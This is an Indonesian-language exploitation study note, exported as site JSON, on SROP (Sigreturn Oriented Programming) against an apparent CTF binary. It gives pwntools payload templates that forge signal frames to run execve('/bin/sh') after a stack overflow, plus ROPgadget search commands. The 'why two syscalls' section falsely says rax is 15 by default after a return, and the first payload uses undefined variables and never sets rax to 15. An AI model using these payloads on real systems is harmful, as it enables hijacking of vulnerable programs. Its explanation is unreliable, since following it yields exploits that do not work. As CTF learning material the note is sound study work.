{"id":"cybersecurity/pwn/11.-advanced-pwn/srop-(sigreturn-oriented-programming)","title":"SROP (Sigreturn Oriented Programming)","slug":"srop (sigreturn oriented programming)","relativePath":"CyberSecurity/PWN/11. Advanced PWN/SROP (Sigreturn Oriented Programming).md","folder":"CyberSecurity/PWN/11. Advanced PWN","frontmatter":{"tags":[],"aliases":[]},"tags":["cybersecurity"],"aliases":[],"headings":[{"depth":2,"text":"Cara kerja","id":"cara-kerja"},{"depth":2,"text":"Payload","id":"payload"},{"depth":1,"text":"system = libc.sym.system (kalau libc di-leak)","id":"system-libcsymsystem-kalau-libc-di-leak"},{"depth":2,"text":"Aturan frame","id":"aturan-frame"},{"depth":1,"text":"syscall pertama = rt_sigreturn -> restore frame","id":"syscall-pertama-rt_sigreturn-restore-frame"},{"depth":1,"text":"syscall kedua (frame.rip) dengan rax=59 -> execve","id":"syscall-kedua-framerip-dengan-rax59-execve"},{"depth":2,"text":"Kenapa 2 syscall?","id":"kenapa-2-syscall"},{"depth":2,"text":"Syarat & catatan","id":"syarat-catatan"},{"depth":1,"text":"atau di libc","id":"atau-di-libc"},{"depth":2,"text":"Alur ringkas","id":"alur-ringkas"}],"content":"#cybersecurity\n\nSROP (Sigreturn Oriented Programming) memanfaatkan syscall `rt_sigreturn` (nomor 15 di x64) untuk **mengontrol semua register sekaligus** lewat signal frame palsu - tanpa perlu gadget `pop rdi; ret` satu per satu.\n\n## Cara kerja\n\nSaat kernel memproses sinyal, ia menyimpan seluruh konteks register ke **signal frame** di stack, lalu memanggil `rt_sigreturn` untuk memulihkannya. Kalau kita bisa memalsukan frame itu, kita bisa set `rip`, `rdi`, `rsp`, `rax`, semuanya.\n\nSyarat: ada gadget **`syscall; ret`** (di binary/libc/vdso).\n\n## Payload\n\n```python\nfrom pwn import *\n\ncontext.arch = \"amd64\"\ncontext.binary = elf = ELF(\"./chall\")\n\nsyscall_ret = 0x401018   # gadget syscall; ret (dari ROPgadget)\nbinsh = 0x402004         # alamat \"/bin/sh\" (di binary atau libc)\n# system = libc.sym.system (kalau libc di-leak)\n\nframe = SigreturnFrame()\nframe.rip = system        # atau alamat execve / one gadget\nframe.rdi = binsh\nframe.rsp = 0x0\n\npayload = b\"A\" * offset\npayload += p64(syscall_ret)\npayload += bytes(frame)\n```\n\n## Aturan frame\n\n```python\nframe = SigreturnFrame()\nframe.rax = 59        # kalau mau langsung execve (bukan panggil system)\nframe.rdi = binsh\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = syscall_ret   # eksekusi syscall dengan register di atas\n```\n\nIni versi \"execve langsung\":\n\n```python\nframe = SigreturnFrame()\nframe.rax = 59\nframe.rdi = binsh\nframe.rsi = 0\nframe.rdx = 0\nframe.rip = syscall_ret\n\npayload = b\"A\"*offset + p64(syscall_ret) + bytes(frame)\n# syscall pertama = rt_sigreturn -> restore frame\n# syscall kedua (frame.rip) dengan rax=59 -> execve\n```\n\n## Kenapa 2 syscall?\n\n1. `syscall` pertama (dari gadget) menjalankan `rt_sigreturn` karena `rax` masih 15 (default setelah ret dari fungsi yang dipanggil syscall) - frame dipulihkan.\n2. `frame.rip` menunjuk ke gadget `syscall` lagi, dan `frame.rax = 59` → execve dijalankan dengan register dari frame.\n\nDi beberapa kasus hanya butuh 1 syscall (kalau rax sudah 15).\n\n## Syarat & catatan\n\n1. Ada gadget `syscall; ret` - cari:\n\n```bash\nROPgadget --binary chall | grep syscall\n# atau di libc\nROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep \"syscall ; ret\"\n```\n\n2. `SigreturnFrame()` dari pwntools otomatis menyesuaikan arch.\n3. SROP sering jadi pilihan saat tidak ada gadget pop (binary minimal).\n4. Stack harus punya cukup ruang untuk frame (ukuran frame ±248 byte di 64-bit).\n5. Kalau binary punya `syscall` tapi tidak ada \"/bin/sh\" - taruh \"/bin/sh\" di `.bss` dulu (pakai read).\n\n## Alur ringkas\n\n```\n1. Cari gadget syscall; ret\n2. Cari/leak alamat /bin/sh (binary, bss, atau libc)\n3. Susun SigreturnFrame dengan rax=59, rdi=/bin/sh, rip=syscall_ret\n4. Payload: offset + p64(syscall_ret) + frame\n5. Shell!\n```\n","excerpt":"#cybersecurity","readingTime":3,"updated":null,"contentHash":"sha256:e73452a024fbd820b18617c53801f83587673cba58e70a933410a4ea30dc85d7","outputPath":"CyberSecurity/PWN/11. Advanced PWN/SROP (Sigreturn Oriented Programming)","breadcrumb":["CyberSecurity","PWN","11. Advanced PWN"],"links":[],"backlinks":[{"id":"cybersecurity/pwn/11.-advanced-pwn/11.-advanced-pwn","title":"11. Advanced PWN"}],"brokenLinks":[],"html":"<p>SROP (Sigreturn Oriented Programming) memanfaatkan syscall <code>rt_sigreturn</code> (nomor 15 di x64) untuk <strong>mengontrol semua register sekaligus</strong> lewat signal frame palsu - tanpa perlu gadget <code>pop rdi; ret</code> satu per satu.</p>\n<h2 id=\"cara-kerja\">Cara kerja</h2>\n<p>Saat kernel memproses sinyal, ia menyimpan seluruh konteks register ke <strong>signal frame</strong> di stack, lalu memanggil <code>rt_sigreturn</code> untuk memulihkannya. Kalau kita bisa memalsukan frame itu, kita bisa set <code>rip</code>, <code>rdi</code>, <code>rsp</code>, <code>rax</code>, semuanya.</p>\n<p>Syarat: ada gadget <strong><code>syscall; ret</code></strong> (di binary/libc/vdso).</p>\n<h2 id=\"payload\">Payload</h2>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n\ncontext.arch = <span class=\"hljs-string\">\"amd64\"</span>\ncontext.binary = elf = ELF(<span class=\"hljs-string\">\"./chall\"</span>)\n\nsyscall_ret = <span class=\"hljs-number\">0x401018</span>   <span class=\"hljs-comment\"># gadget syscall; ret (dari ROPgadget)</span>\nbinsh = <span class=\"hljs-number\">0x402004</span>         <span class=\"hljs-comment\"># alamat \"/bin/sh\" (di binary atau libc)</span>\n<span class=\"hljs-comment\"># system = libc.sym.system (kalau libc di-leak)</span>\n\nframe = SigreturnFrame()\nframe.rip = system        <span class=\"hljs-comment\"># atau alamat execve / one gadget</span>\nframe.rdi = binsh\nframe.rsp = <span class=\"hljs-number\">0x0</span>\n\npayload = <span class=\"hljs-string\">b\"A\"</span> * offset\npayload += p64(syscall_ret)\npayload += <span class=\"hljs-built_in\">bytes</span>(frame)\n</code></pre>\n<h2 id=\"aturan-frame\">Aturan frame</h2>\n<pre><code class=\"hljs language-python\">frame = SigreturnFrame()\nframe.rax = <span class=\"hljs-number\">59</span>        <span class=\"hljs-comment\"># kalau mau langsung execve (bukan panggil system)</span>\nframe.rdi = binsh\nframe.rsi = <span class=\"hljs-number\">0</span>\nframe.rdx = <span class=\"hljs-number\">0</span>\nframe.rip = syscall_ret   <span class=\"hljs-comment\"># eksekusi syscall dengan register di atas</span>\n</code></pre>\n<p>Ini versi \"execve langsung\":</p>\n<pre><code class=\"hljs language-python\">frame = SigreturnFrame()\nframe.rax = <span class=\"hljs-number\">59</span>\nframe.rdi = binsh\nframe.rsi = <span class=\"hljs-number\">0</span>\nframe.rdx = <span class=\"hljs-number\">0</span>\nframe.rip = syscall_ret\n\npayload = <span class=\"hljs-string\">b\"A\"</span>*offset + p64(syscall_ret) + <span class=\"hljs-built_in\">bytes</span>(frame)\n<span class=\"hljs-comment\"># syscall pertama = rt_sigreturn -> restore frame</span>\n<span class=\"hljs-comment\"># syscall kedua (frame.rip) dengan rax=59 -> execve</span>\n</code></pre>\n<h2 id=\"kenapa-2-syscall\">Kenapa 2 syscall?</h2>\n<ol>\n<li><code>syscall</code> pertama (dari gadget) menjalankan <code>rt_sigreturn</code> karena <code>rax</code> masih 15 (default setelah ret dari fungsi yang dipanggil syscall) - frame dipulihkan.</li>\n<li><code>frame.rip</code> menunjuk ke gadget <code>syscall</code> lagi, dan <code>frame.rax = 59</code> → execve dijalankan dengan register dari frame.</li>\n</ol>\n<p>Di beberapa kasus hanya butuh 1 syscall (kalau rax sudah 15).</p>\n<h2 id=\"syarat-catatan\">Syarat &#x26; catatan</h2>\n<ol>\n<li>Ada gadget <code>syscall; ret</code> - cari:</li>\n</ol>\n<pre><code class=\"hljs language-bash\">ROPgadget --binary chall | grep syscall\n<span class=\"hljs-comment\"># atau di libc</span>\nROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep <span class=\"hljs-string\">\"syscall ; ret\"</span>\n</code></pre>\n<ol>\n<li><code>SigreturnFrame()</code> dari pwntools otomatis menyesuaikan arch.</li>\n<li>SROP sering jadi pilihan saat tidak ada gadget pop (binary minimal).</li>\n<li>Stack harus punya cukup ruang untuk frame (ukuran frame ±248 byte di 64-bit).</li>\n<li>Kalau binary punya <code>syscall</code> tapi tidak ada \"/bin/sh\" - taruh \"/bin/sh\" di <code>.bss</code> dulu (pakai read).</li>\n</ol>\n<h2 id=\"alur-ringkas\">Alur ringkas</h2>\n<pre><code>1. Cari gadget syscall; ret\n2. Cari/leak alamat /bin/sh (binary, bss, atau libc)\n3. Susun SigreturnFrame dengan rax=59, rdi=/bin/sh, rip=syscall_ret\n4. Payload: offset + p64(syscall_ret) + frame\n5. Shell!\n</code></pre>","previous":"cybersecurity/pwn/11.-advanced-pwn/ret2dlresolve","next":"cybersecurity/pwn/11.-advanced-pwn/stack-pivot"}